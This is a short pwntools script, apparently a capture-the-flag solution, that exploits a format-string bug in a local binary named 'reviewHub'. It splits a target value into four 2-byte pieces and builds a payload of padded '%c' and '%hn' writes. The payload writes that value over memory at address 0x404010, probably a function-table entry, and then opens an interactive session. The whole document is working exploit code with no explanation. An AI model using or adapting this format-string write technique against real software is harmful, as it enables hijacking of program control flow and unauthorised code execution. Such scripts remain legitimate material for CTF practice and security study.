from pwn import*

p = process('./reviewHub')

value = 0xfffffed4a58948
address = 0x00404010

v1 = value & 0xffff
v2 = (value >> 0x10) & 0xffff
v3 = (value >> 0x20) & 0xffff
v4 = (value >> 0x30) & 0xffff

payload = b'5\n'
payload += bytes(f"%{v4}c%22$hn", "utf-8")
payload += bytes(f"%{v1-v4}c%19$hn", "utf-8")
payload += bytes(f"%{v2-v1}c%20$hn", "utf-8")
payload += bytes(f"%{v3-v2}c%21$hn", "utf-8")
print(payload)
payload += b'A' * 0x6
print(len(payload))
payload += p64(address)
payload += p64(address+0x2)
payload += p64(address+0x4)
payload += p64(address+0x6)

p.sendline(payload)

p.interactive()


